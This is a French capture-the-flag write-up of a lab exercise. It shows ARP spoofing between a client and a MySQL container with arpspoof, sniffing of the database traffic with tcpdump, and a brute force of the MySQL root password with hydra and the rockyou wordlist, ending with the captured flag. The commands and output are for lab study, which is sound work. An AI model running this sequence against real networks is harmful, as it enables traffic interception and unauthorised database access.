III. ARP Spoofing Ecoute active
```
    Le but de cet exercice cette fois-ci est de récolter des informations dans un réseau
à travers une machine que nous controlons. D'après l'énoncé de ce challenge, le flag est divisé en deux parties , d'un coté qui est la réponse d'une requete sur le réseau et de l'autre le mot de passe de la base de données.
- Je commence par savoir déjà qui je suis :
root@fac50de5d760:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
7: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```
```
- Je vais ensuite scanner mon réseau pour voir ce qu'il y'a :
root@fac50de5d760:~# nmap -sn 172.18.0.0/16
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-05 18:05 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000035s latency).
MAC Address: 02:42:F6:10:3E:7B (Unknown)
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000044s latency).
MAC Address: 02:42:AC:12:00:02 (Unknown)
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000035s latency).
MAC Address: 02:42:AC:12:00:04 (Unknown)
Nmap scan report for fac50de5d760 (172.18.0.3)
Host is up.

C'est là que je remarque deux machines bien distinctes, une base de donnée avec l'ip 172.18.0.2 et un client avec l'ip 172.18.0.4.
Pour faire une attaque MITM entre ces deux machines, je vais faire une attaque ARP pour la mener à bien.
```
```
- Par la suite, je vais utiliser la commande "arpspoof" pour envoyer en continu des paquets ARP pour la falsification de la table ARP du client et de la base de données.
root@fac50de5d760:~# arpspoof -t 172.18.0.4 -r 172.18.0.2
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
....
```
```
- Pendant que les requetes tournent en continu, je vais scanner la base de donnée pour en savoir un peu plus.
root@fac50de5d760:~# nmap 172.18.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-05 18:15 UTC
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000041s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:02 (Unknown)
 
Et en effet, je vois que c'est bien une base de donnée avec en plus un port ouvert (3306).
```
```
- Ducoup, avec la commande "tcpdump", je peux aller voir les données qui sont sur le réseau en précisant bien le port 3306.
root@fac50de5d760:~# tcpdump -A port 3306

Et en cherchant un peu dans les résultats, je tombe bien sur la première partie du flag :
"first part of the flag: l1tter4lly_4_c4ptur3_th3_fl4g"
```
```
- Par la suite, je vais importter une liste de mots de passes les plus fréquemment utiliser pour le brute force afin de récupérer le mot de passe de la base de données.
root@fac50de5d760:~# wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

- Je vais donc pour finir utiliser la commande "hydra" pour mener à bien cette attaque.

root@fac50de5d760:~# hydra -l root -P rockyou.txt 172.18.0.2 mysql
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-05 18:20:47
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking mysql://172.18.0.2:3306/
[3306][mysql] host: 172.18.0.2   login: root   password: heyheyhey
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-05 18:21:43
```
```
Le flag final est donc : `l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey`
```
